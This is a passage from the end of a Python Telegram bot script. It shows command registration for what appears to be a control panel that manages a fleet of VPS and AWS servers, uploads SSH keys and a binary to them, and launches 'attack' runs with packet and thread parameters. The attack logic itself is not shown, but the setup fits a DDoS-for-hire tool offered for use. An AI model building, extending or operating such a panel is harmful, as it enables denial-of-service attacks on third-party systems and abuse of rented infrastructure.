    if result.deleted_count > 0 or aws_result.deleted_count > 0:
        await context.bot.send_message(chat_id, f"✅ *VPS `{vps_ip}` has been removed!*", parse_mode="Markdown")
    else:
        await context.bot.send_message(chat_id, f"⚠️ *No VPS found with IP `{vps_ip}`!*", parse_mode="Markdown")

# Main function
def main():
    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help_cmd", help_command))
    app.add_handler(CommandHandler("add_admin", add_admin))
    app.add_handler(CommandHandler("remove_admin", remove_admin))
    app.add_handler(CommandHandler("list_admins", list_admins))
    app.add_handler(CommandHandler("add_vps", add_vps))
    app.add_handler(CommandHandler("add_aws_vps", add_aws_vps))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("vps_status", vps_status))
    app.add_handler(CommandHandler("upload_pem", upload_pem_command))
    app.add_handler(CommandHandler("upload_binary", upload_binary_command))
    app.add_handler(CommandHandler("setup", setup_vps))
    app.add_handler(CommandHandler("add_user", add_user))
    app.add_handler(CommandHandler("remove_user", remove_user))
    app.add_handler(CommandHandler("list_users", list_users))
    app.add_handler(CommandHandler("remove_vps", remove_vps))
    app.add_handler(CommandHandler("PKT", pkt_command))
    app.add_handler(CommandHandler("THREAD", thread_command))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_config_input))

    app.add_handler(MessageHandler(filters.Document.FileExtension("pem"), handle_pem_upload))
    app.add_handler(MessageHandler(~filters.Document.FileExtension("pem"), handle_binary_upload))

    app.run_polling()

if __name__ == "__main__":
    main()
